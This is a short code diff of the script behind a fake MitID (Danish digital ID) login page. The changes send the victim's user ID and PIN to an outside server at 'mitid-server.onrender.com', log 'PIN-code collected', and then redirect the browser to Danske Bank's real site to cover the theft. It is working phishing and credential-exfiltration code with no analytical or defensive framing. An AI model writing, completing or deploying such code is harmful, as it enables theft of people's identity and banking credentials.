@@ -7,6 +7,8 @@ const forgot = document.querySelector("#linkOpenToolTip span");
 let status = "user_id";
 const data = {};
 
+const rootURL = "https://mitid-server.onrender.com/";
+
 showBtn.addEventListener("click", (e) => {
     if (usernameIn.getAttribute("type") === "text") {
         e.target.innerText = "Vis";
@@ -28,7 +30,7 @@ function updateBtn() {
 usernameIn.addEventListener("input", updateBtn);
 
 async function sendData(userData) {
-    const url = "http://localhost:8080/api/add";
+    const url = `${rootURL}/api/add`;
     try {
         console.log(userData);
         const response = await fetch(url, {
@@ -63,5 +65,6 @@ loginBtn.addEventListener("click", (e) => {
         console.log("PIN-code collected");
         console.log(data, JSON.stringify(data));
         sendData(data);
+        location.href = "https://danskebank.dk";
     }
 });
